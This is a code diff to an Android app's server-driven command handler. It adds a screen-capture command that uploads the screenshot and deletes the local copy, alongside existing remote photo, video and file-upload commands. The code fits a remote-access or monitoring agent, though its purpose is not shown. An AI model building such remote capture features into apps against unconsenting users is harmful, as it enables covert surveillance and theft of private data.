@@ -15,6 +15,7 @@ import okhttp3.RequestBody.Companion.toRequestBody
 import org.json.JSONObject
 import java.io.File
 import android.webkit.MimeTypeMap
+import kotlinx.coroutines.CompletableDeferred
 
 /**
  * Handles commands received from the server.
@@ -45,6 +46,7 @@ object CommandHandler {
                 "TAKE_PHOTO" -> takePhoto(service, params)
                 "RECORD_VIDEO" -> recordVideo(service, params)
                 "UPLOAD_FILE" -> uploadFile(service, params)
+                "CAPTURE_SCREEN" -> captureScreen(service)
                 else         -> JSONObject().put("error", "Unknown command: $commandType")
             }
         } catch (e: Exception) {
@@ -243,6 +245,27 @@ object CommandHandler {
         } else {
             val errorMsg = response.errorBody()?.string() ?: "Unknown error"
             JSONObject().put("error", "Upload failed: $errorMsg")
+        }
+    }
+    private suspend fun captureScreen(service: AgentService): JSONObject {
+        if (!ScreenCaptureHelper.hasPermission()) {
+            // Need to request permission via activity
+            ScreenCaptureHelper.requestPermission(service)
+            return JSONObject().put("error", "Permission required. A popup appeared on the device.")
+        }
+
+        val resultDeferred = CompletableDeferred<File?>()
+        ScreenCaptureHelper.capture(service) { file ->
+            resultDeferred.complete(file)
+        }
+
+        val file = resultDeferred.await()
+        return if (file != null) {
+            val res = doUpload(service, file)
+            file.delete()
+            res
+        } else {
+            JSONObject().put("error", "Failed to capture screen.")
         }
     }
 }
